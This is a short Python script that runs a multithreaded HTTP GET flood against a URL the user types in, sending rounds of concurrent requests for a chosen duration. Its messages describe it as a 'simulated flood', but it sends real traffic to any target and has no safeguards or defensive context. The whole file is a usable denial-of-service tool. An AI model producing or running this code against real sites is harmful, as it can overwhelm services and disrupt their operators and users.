import requests
import threading
import time

def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request sent to {url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending request to {url}: {e}")

def flood(url, num_threads=100, duration=10):
    print(f"Initiating simulated flood on {url} with {num_threads} threads for {duration} seconds...")
    threads = []
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(num_threads):
            thread = threading.Thread(target=send_request, args=(url,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join() # Wait for all threads to complete one round
        threads = [] # Reset threads for the next round

if __name__ == "__main__":
    target_url = input("Enter the target URL (HTTP & HTTPS) > ")
    num_threads = int(input("Enter the number of threads (e.g., 100) > "))
    duration = int(input("Enter the duration (in seconds) > "))


    flood(target_url, num_threads, duration)
